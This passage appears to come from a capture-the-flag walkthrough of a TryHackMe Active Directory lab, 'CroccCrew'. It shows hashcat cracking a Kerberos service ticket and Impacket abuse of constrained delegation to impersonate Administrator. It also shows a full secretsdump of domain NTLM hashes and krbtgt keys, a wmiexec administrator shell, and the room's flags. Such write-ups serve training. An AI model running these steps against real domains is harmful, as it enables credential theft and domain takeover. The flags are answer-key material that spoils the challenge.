00ecdee7878843fb346d238df2e1730c393f8aaea740ac1474fd5d9a3d4b5bf1e7004c8d86a535b8e5dd238e59bfae1fc860c70b81b54a1df22e9f7845c574d53e686e17773a7d4ed4a730937de308d1bd5b28779aae3db7a78291e545ff869e1584393d6eb87dbb0281d21b74d4a3e17adecdcb675e8bb52f380db0d98a2f05d74bdb78c4cd32aa4f3b2241dd5227f7b6cab4d8610ce3f5b79ec40602cb8c7c52ba98cb521c974eae464989bea0d31ed93e0c4b12376e6ebbf0f9268a81b6650d1a40f68d54406530b48dce2dc749afd1cec15b5c406e2586962f69f4d9b56b3bce1d6421c770bf3a7e1e4b8fa23fd4f46ad0c8a3dc3c5e0ccaffec177ced2d24c8320d16aa6249adfdc7462be388a8faba4b4dcdcfabd9b4fa6ee81dff463489c7d2c6f46f1347e00f32591b0cfd96b43495b48c4daf05c27494f8f4331379b559f72770f8e6654b8df92848788198706b40672541d91893530a4cd981453ca8076b47df7a7d9ee775e5ab9f9f3687059507570474d42905a5bb860f64b295ece323949cd22715772d1e5ed:resetpassword
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CO...d1e5ed
...
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   348.0 kH/s (6.86ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 237568/14344384 (1.66%)
Rejected.........: 0/237568 (0.00%)
Restore.Point....: 233472/14344384 (1.63%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: superfresa -> niceshot
...

```

<br>

![image](https://github.com/user-attachments/assets/3c44678e-0a95-4272-a731-9d67fa0ae7fb)

<br>

<p>Used <code>crackmapexec</code> with  <code>password-reset</code>code>:<code>resetpassword</code></p>

<br>

<br>

```bash
:~/CroccCrew# python3 /opt/impacket/build/scripts-3.9/findDelegation.py -dc-ip TargetIP COOCTUS.CORP/password-reset:resetpassword
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

AccountName     AccountType  DelegationType                      DelegationRightsTo                  
--------------  -----------  ----------------------------------  -----------------------------------
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP 
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP              
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                           
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS      
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS            

```
<br>

![image](https://github.com/user-attachments/assets/7d1ac4aa-03c6-4c94-99f3-7292d0dc2042)

<br>

<br>

```bash
:~/CroccCrew# python3 /opt/impacket/build/scripts-3.9/getST.py -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip TargetIP
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
:~/CroccCrew# export KRB5CCNAME=Administrator.ccache
```

![image](https://github.com/user-attachments/assets/5e41a30a-e706-4c2f-88ed-973e04011d74)


<br>


```bash
~/CroccCrew# ~/CroccCrew# impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
COOCTUS\DC$:plain_password_hex:04b6009706cbd64b3795f8a63de8bd008865e127c61f171a7c9dafe9889cb3bcc93cc498a029300290bfd1302b24ca7c08af482e5ef40a40337e216f58ae4d075f2f7c1b522f6f1914a8ce10db8ea9eee9c7a075a48a0efef5352f4f5d92dc6199d8a4489c9596681346fa509092aebd5f1e143fc578dfcdfea537ebcde0ca665690c2e857183c5c68a5036163ed2c2bf5e5fa95d27a6a3f32e8ed9051af6a2dfc0d57dd19f8f289ca42a34d02025ddcb6ac6bd19f9d47ec9da25e407e867b3ba1e2093c5f360be5b6bd29b2a1ef9bc48a201e1e87832e655673703d9412c7fee8a0c38c5fd96cce0f3d528b6f961ad0
COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:62646c3ba12b64b9a8e7434c6c82cb13:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90dcab62cc0658120848244ef:::
COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099a7c8eaecb42b3d73cc9b7:::
COOCTUS.CORP\Spooks:1117:aad3b435b51404eeaad3b435b51404ee:07148bf4dacd80f63ef09a0af64fbaf9:::
COOCTUS.CORP\Steve:1119:aad3b435b51404eeaad3b435b51404ee:2ae85453d7d606ec715ef2552e16e9b0:::
COOCTUS.CORP\Howard:1120:aad3b435b51404eeaad3b435b51404ee:65340e6e2e459eea55ae539f0ec9def4:::
COOCTUS.CORP\admCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
COOCTUS.CORP\Fawaz:1122:aad3b435b51404eeaad3b435b51404ee:d342c532bc9e11fc975a1e7fbc31ed8c:::
COOCTUS.CORP\karen:1123:aad3b435b51404eeaad3b435b51404ee:e5810f3c99ae2abb2232ed8458a61309:::
COOCTUS.CORP\cryillic:1124:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
COOCTUS.CORP\yumeko:1125:aad3b435b51404eeaad3b435b51404ee:c0e0e39ac7cab8c57c3543c04c340b49:::
COOCTUS.CORP\pars:1126:aad3b435b51404eeaad3b435b51404ee:fad642fb63dcc57a24c71bdc47e55a05:::
COOCTUS.CORP\kevin:1127:aad3b435b51404eeaad3b435b51404ee:48de70d96bf7b6874ec195cd5d389a09:::
COOCTUS.CORP\jon:1128:aad3b435b51404eeaad3b435b51404ee:7f828aaed37d032d7305d6d5016ccbb3:::
COOCTUS.CORP\Varg:1129:aad3b435b51404eeaad3b435b51404ee:7da62b00d4b258a03708b3c189b41a7e:::
COOCTUS.CORP\evan:1130:aad3b435b51404eeaad3b435b51404ee:8c4b625853d78e84fb8b3c4bcd2328c5:::
COOCTUS.CORP\Ben:1131:aad3b435b51404eeaad3b435b51404ee:1ce6fec89649608d974d51a4d6066f12:::
COOCTUS.CORP\David:1132:aad3b435b51404eeaad3b435b51404ee:f863e27063f2ccfb71914b300f69186a:::
COOCTUS.CORP\password-reset:1134:aad3b435b51404eeaad3b435b51404ee:0fed9c9dc78da2c6f37f885ee115585c:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:62646c3ba12b64b9a8e7434c6c82cb13:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
Administrator:des-cbc-md5:5243234aef9d0e83
krbtgt:aes256-cts-hmac-sha1-96:25776b9622e67e69a5aee9cf532aa6ffec9318ba780e2f5c966c0519d5958f1e
krbtgt:aes128-cts-hmac-sha1-96:69988d411f292b02157b8fc1b539bd98
krbtgt:des-cbc-md5:d9eff2048f2f3e46
COOCTUS.CORP\Visitor:aes256-cts-hmac-sha1-96:e107d748348260a625b7635855f0f403731a06837f2875bec8e15b4be9e017c3
COOCTUS.CORP\Visitor:aes128-cts-hmac-sha1-96:d387522d6ce2698ddde8c0f5126eca90
COOCTUS.CORP\Visitor:des-cbc-md5:a8023e2c04e910fb
COOCTUS.CORP\mark:aes256-cts-hmac-sha1-96:ee0949690f31a22898f0808386aa276b2303f82a6b06da39b9735da1b5fc4c8d
COOCTUS.CORP\mark:aes128-cts-hmac-sha1-96:ce5df3dfb717b5649ef59e9d8d028c78
COOCTUS.CORP\mark:des-cbc-md5:83da7acd5b85c2f1
COOCTUS.CORP\Jeff:aes256-cts-hmac-sha1-96:c57c7d8f9011d0f11633ae83a2db2af53af09d47a9c27fc05e8a932686254ef0
COOCTUS.CORP\Jeff:aes128-cts-hmac-sha1-96:e95538a0752f71a2e615e88fbf3f9151
COOCTUS.CORP\Jeff:des-cbc-md5:4c318a40a792feb0
COOCTUS.CORP\Spooks:aes256-cts-hmac-sha1-96:c70088aaeae0b4fbaf129e3002b4e99536fa97404da96c027626dcfcd4509800
COOCTUS.CORP\Spooks:aes128-cts-hmac-sha1-96:7f95dc2d8423f0607851a27c46e3ba0d
COOCTUS.CORP\Spooks:des-cbc-md5:0231349bcd549b97
COOCTUS.CORP\Steve:aes256-cts-hmac-sha1-96:48edbdf191165403dca8103522bc953043f0cd2674f103069c1012dc069e6fd2
COOCTUS.CORP\Steve:aes128-cts-hmac-sha1-96:6f3a688e3d88d44c764253470cf95d0c
COOCTUS.CORP\Steve:des-cbc-md5:0d54b320cba7627a
COOCTUS.CORP\Howard:aes256-cts-hmac-sha1-96:6ea6db6a4d5042326f93037d4ec4284d6bbd4d79a6f9b07782aaf4257baa13f8
COOCTUS.CORP\Howard:aes128-cts-hmac-sha1-96:6926ab9f1a65d7380de82b2d29a55537
COOCTUS.CORP\Howard:des-cbc-md5:9275c8ba40a16b86
COOCTUS.CORP\admCroccCrew:aes256-cts-hmac-sha1-96:3fb5b3d1bdfc4aff33004420046c94652cba6b70fd9868ace49d073170ec7db1
COOCTUS.CORP\admCroccCrew:aes128-cts-hmac-sha1-96:19894057a5a47e1b6991c62009b8ded4
COOCTUS.CORP\admCroccCrew:des-cbc-md5:ada854ce919d2c75
COOCTUS.CORP\Fawaz:aes256-cts-hmac-sha1-96:4f2b258698908a6dbac21188a42429ac7d89f5c7e86dcf48df838b2579b262bc
COOCTUS.CORP\Fawaz:aes128-cts-hmac-sha1-96:05d26514fe5a64e76484e5cf84c420c1
COOCTUS.CORP\Fawaz:des-cbc-md5:a7d525e501ef1fbc
COOCTUS.CORP\karen:aes256-cts-hmac-sha1-96:dc423de7c5e44e8429203ca226efed450ed3d25d6d92141853d22fee85fddef0
COOCTUS.CORP\karen:aes128-cts-hmac-sha1-96:6e66c00109942e45588c448ddbdd005d
COOCTUS.CORP\karen:des-cbc-md5:a27cf23eaba4708a
COOCTUS.CORP\cryillic:aes256-cts-hmac-sha1-96:f48f9f9020cf318fff80220a15fea6eaf4a163892dd06fd5d4e0108887afdabc
COOCTUS.CORP\cryillic:aes128-cts-hmac-sha1-96:0b8dd6f24f87a420e71b4a649cd28a39
COOCTUS.CORP\cryillic:des-cbc-md5:6d92892ab9c74a31
COOCTUS.CORP\yumeko:aes256-cts-hmac-sha1-96:7c3bd36a50b8f0b880a1a756f8f2495c14355eb4ab196a337c977254d9dfd992
COOCTUS.CORP\yumeko:aes128-cts-hmac-sha1-96:0d33127da1aa3f71fba64525db4ffe7e
COOCTUS.CORP\yumeko:des-cbc-md5:8f404a1a97e0435e
COOCTUS.CORP\pars:aes256-cts-hmac-sha1-96:0c72d5f59bc70069b5e23ff0b9074caf6f147d365925646c33dd9e649349db86
COOCTUS.CORP\pars:aes128-cts-hmac-sha1-96:79314ceefa18e30a02627761bb8dfee9
COOCTUS.CORP\pars:des-cbc-md5:15d552643220868a
COOCTUS.CORP\kevin:aes256-cts-hmac-sha1-96:9982245b622b09c28c77adc34e563cd30cb00d159c39ecc7bc0f0a8857bcc065
COOCTUS.CORP\kevin:aes128-cts-hmac-sha1-96:51cc7562d3de39f345b68e6923725a6a
COOCTUS.CORP\kevin:des-cbc-md5:89201a58e33ed9ba
COOCTUS.CORP\jon:aes256-cts-hmac-sha1-96:9fa5e82157466b813a7b05c311a25fd776182a1c6c9e20d15330a291c3e961e5
COOCTUS.CORP\jon:aes128-cts-hmac-sha1-96:a6202c53070db2e3b5327cef1bb6be86
COOCTUS.CORP\jon:des-cbc-md5:0dabe370ab64f407
COOCTUS.CORP\Varg:aes256-cts-hmac-sha1-96:e85d21b0c9c41eb7650f4af9129e10a83144200c4ad73271a31d8cd2525bdf45
COOCTUS.CORP\Varg:aes128-cts-hmac-sha1-96:afd9fe7026c127d2b6e84715f3fcc879
COOCTUS.CORP\Varg:des-cbc-md5:8cb92637260eb5c4
COOCTUS.CORP\evan:aes256-cts-hmac-sha1-96:d8f0a955ae809ce3ac33b517e449a70e0ab2f34deac0598abc56b6d48347cdc3
COOCTUS.CORP\evan:aes128-cts-hmac-sha1-96:c67fc5dcd5a750fe0f22ad63ffe3698b
COOCTUS.CORP\evan:des-cbc-md5:c246c7f152d92949
COOCTUS.CORP\Ben:aes256-cts-hmac-sha1-96:1645867acea74aecc59ebf08d7e4d98a09488898bbf00f33dbc5dd2c8326c386
COOCTUS.CORP\Ben:aes128-cts-hmac-sha1-96:59774a99d18f215d34ea1f33a27bf1fe
COOCTUS.CORP\Ben:des-cbc-md5:801c51ea8546b55d
COOCTUS.CORP\David:aes256-cts-hmac-sha1-96:be42bf5c3aa5161f7cf3f8fce60613fc08cee0c487f5a681b1eeb910bf079c74
COOCTUS.CORP\David:aes128-cts-hmac-sha1-96:6b17ec1654837569252f31fec0263522
COOCTUS.CORP\David:des-cbc-md5:e5ba4f34cd5b6dae
COOCTUS.CORP\password-reset:aes256-cts-hmac-sha1-96:cdcbd00a27dcf5e46691aac9e51657f31d7995c258ec94057774d6e011f58ecb
COOCTUS.CORP\password-reset:aes128-cts-hmac-sha1-96:bb66b50c126becf82f691dfdb5891987
COOCTUS.CORP\password-reset:des-cbc-md5:343d2c5e01b5a74f
DC$:aes256-cts-hmac-sha1-96:cc9f8c5976b364c539efc3e427c824e8442c34a9c3229eb25b71012651954359
DC$:aes128-cts-hmac-sha1-96:ecf025f931e963eed8160ca9838cbf1e
DC$:des-cbc-md5:e6bcfdae026ec449
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
...
```

<br>

<p><code>Administrator</code>:500:<code>aad3b435b51404eeaad3b435b51404ee</code>:7dfa0531d73101ca080c7379a9bff1c7:::

	<br>

```bash
sudo gem install winrm winrm-fs stringio logger fileutils
```

```bash
~/CroccCrew# crackmapexec smb TargetIP -u password-reset -p 'resetpassword' --shares
SMB        TargetIP    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB        TargetIP    445    DC               [+] COOCTUS.CORP\password-reset:resetpassword 
SMB        TargetIP    445    DC               [*] Enumerated shares
SMB        TargetIP    445    DC               Share           Permissions     Remark
SMB        TargetIP    445    DC               -----           -----------     ------
SMB        TargetIP    445    DC               ADMIN$                          Remote Admin
SMB        TargetIP    445    DC               C$                              Default share
SMB        TargetIP    445    DC               Home                            
SMB        TargetIP    445    DC               IPC$            READ            Remote IPC
SMB        TargetIP    445    DC               NETLOGON        READ            Logon server share 
SMB        TargetIP    445    DC               SYSVOL          READ            Logon server share 
:~/CroccCrew# 

```

<br>

```bash
:~/CroccCrew# wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/wmiexec.py
--2025-05-01 ...--  https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/wmiexec.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... ..., ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|...|:...... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19694 (19K) [text/plain]
Saving to: \u2018wmiexec.py\u2019

wmiexec.py                                                                        100%[===========================================================================================================================================================================================================>]  19.23K  --.-KB/s    in 0s      

2025-05-01 .... (53.2 MB/s) - \u2018wmiexec.py\u2019 saved [19694/19694]

:~/CroccCrew# ls
Administrator.ccache         domain_computers.grep  domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html  evil-winrm         wmiexec.py
domain_computers_by_os.html  domain_computers.html  domain_groups.grep     domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json  domain_users.grep           domain_users.json  ldap_croccrew.txt
:~/CroccCrew# chmod +x winexec.py
chmod: cannot access 'winexec.py': No such file or directory
:~/CroccCrew# chmod +x wmiexec.py
:~/CroccCrew# python3 ./wmiexec.py -k -no-pass Administrator@DC.COOCTUS.CORP
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Traceback (most recent call last):
  File "./wmiexec.py", line 409, in <module>
    logger.init(options.ts, options.debug)
TypeError: init() takes from 0 to 1 positional arguments but 2 were given
:~/CroccCrew# cat /etc/hosts
...
TargetIP   DC.COOCTUS.CORP
...
:~/CroccCrew# wmiexec.py -k -no-pass Administrator@DC.COOCTUS.CORP
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
cooctus\administrator

C:\>cd Shares
C:\Shares>cd Home

C:\Shares\Home>dir
 Volume in drive C has no label.
 Volume Serial Number is 1296-13D1

 Directory of C:\Shares\Home

06/08/2021  12:42 PM    <DIR>          .
06/08/2021  12:42 PM    <DIR>          ..
06/08/2021  12:38 PM                28 priv-esc-2.txt
06/07/2021  08:08 PM                22 priv-esc.txt
06/07/2021  08:14 PM                17 user.txt
               3 File(s)             67 bytes
               2 Dir(s)  46,799,917,056 bytes free

C:\Shares\Home>type priv-esc-2.txt
THM{Wh4t-t0-d0...Wh4t-t0-d0}

C:\Shares\Home>
```


<br>


> 2.3. <em>What is the User flag?</em><br><a id='2.3'></a>
>> <strong><code>THM{0n-Y0ur-Way-t0-DA}</code></strong><br>
<p></p>


<br>

```bash
C:\Shares\Home>type priv-esc.txt
THM{0n-Y0ur-Way-t0-DA}

C:\Shares\Home>
```

<br>


> 2.4. <em>What is the Second Privileged User's flag?</em><br><a id='2.4'></a>
>> <strong><code>THM{Wh4t-t0-d0...Wh4t-t0-d0}</code></strong><br>
<p></p>

<br>


```bash
C:\Shares\Home>type priv-esc-2.txt
THM{Wh4t-t0-d0...Wh4t-t0-d0}

C:\Shares\Home>
```

<br>


<br>


> 2.5. <em>What is the Second Privileged User's flag?</em>Hint : <em>The flag is located in c:\PerfLogs\Admin\</em><br><a id='2.5'></a>
>> <strong><code>THM{Cr0ccCrewStr1kes!}</code></strong><br>
<p></p>

<br>

```bash
C:\Shares\Home>cd c:\PerfLogs\Admin\
c:\PerfLogs\Admin>dir
 Volume in drive C has no label.
 Volume Serial Number is 1296-13D1

 Directory of c:\PerfLogs\Admin

06/08/2021  12:42 PM    <DIR>          .
06/08/2021  12:42 PM    <DIR>          ..
06/07/2021  08:07 PM                22 root.txt
               1 File(s)             22 bytes
               2 Dir(s)  46,802,284,544 bytes free

c:\PerfLogs\Admin>type root.txt
THM{Cr0ccCrewStr1kes!}
c:\PerfLogs\Admin>
```

<br>
<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="1000px" src="https://github.com/user-attachments/assets/742fff1f-0bb6-4183-82d7-324fe68046b4"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/43633222-3314-4ef2-b864-7adbdfef4ce5"></p>


<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| May 1, 2025       | 360      |     244ᵗʰ    |      6ᵗʰ     |     281ˢᵗ   |    10ᵗʰ    |  98,807  |    698    |     60    |

</div>

<br>

<p align="center"> Global All Time:  244ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/5acfbc0b-e27d-4c82-a3da-6042277ec757"> </p>

<p align="center"> Brazil All Time:    6ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/57792014-f88c-4d10-b114-c4ede0a2cbb6"> </p>
"> </p>

<p align="center"> Global monthly:    281ˢᵗ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/a198bf71-3853-4e6e-ac82-625c953551d0"> </p>

<p align="center"> Brazil monthly:    10ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/f79eac33-6556-4fc1-ab83-0fa82b9c1bf4"> </p>

<br>
<br>


<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/tryhackme">tryhackme</a> for investing your time and effort to develop this challenge so that I could sharpen my skills!</p> 
